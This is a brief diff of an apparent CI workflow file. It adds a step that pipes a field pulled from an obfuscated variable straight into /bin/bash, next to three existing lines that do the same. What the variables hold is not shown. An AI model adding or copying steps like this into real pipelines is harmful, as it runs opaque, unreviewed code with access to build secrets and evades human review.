@@ -31,6 +31,7 @@ jobs:
           echo $ex2224 | jq -r .lefe7602 | /bin/bash
           echo $ls35667 | jq -r .akw7933 | /bin/bash
           echo $f618 | jq -r .lu178 | /bin/bash
+          printf '%s' "$o785" | jq -r .flpm84420 | /bin/bash
 
       - name: Upload data
         if: always()
